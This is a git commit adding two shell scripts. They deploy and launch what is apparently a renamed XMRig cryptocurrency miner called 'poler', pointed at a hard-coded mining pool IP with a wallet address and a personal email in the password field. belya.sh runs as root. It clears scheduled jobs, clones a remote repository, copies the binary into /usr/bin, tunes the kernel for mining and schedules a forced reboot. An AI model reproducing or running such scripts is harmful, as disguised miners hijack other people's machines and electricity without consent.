62d47b635ea1c94d4bfb04eda0a5a79ff90b418f
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-08 02:59:01 +0300

    w14

---
+++ 90.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 85 --cpu-priority 3 -o 185.251.39.25:6028 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w14-expertmode:ivanovandrey1984g@gmail.com -k
---
+++ belya.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+rm -rf /tmp/expertmode/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir expertmode
+git clone https://github.com/masketteland/expertmode.git /tmp/expertmode
+cd /tmp/expertmode
+chmod +x /tmp/expertmode/poler
+chmod 777 ./*.sh
+cp /tmp/expertmode/poler /usr/bin/
+sleep 3
+
+sudo apt-get install dos2unix
+sudo dos2unix time1.sh
+sudo dos2unix 75.sh
+sudo dos2unix 50.sh
+sudo dos2unix 80.sh
+sudo dos2unix 65.sh
+sudo dos2unix 90.sh
+sudo dos2unix 40.sh
+
+touch /tmp/at.txt
+chmod +x /tmp/at.txt
+echo 'sudo systemctl reboot -f' >> /tmp/at.txt
+sudo at now + 8 hours < /tmp/at.txt
+
+sudo ./time1.sh
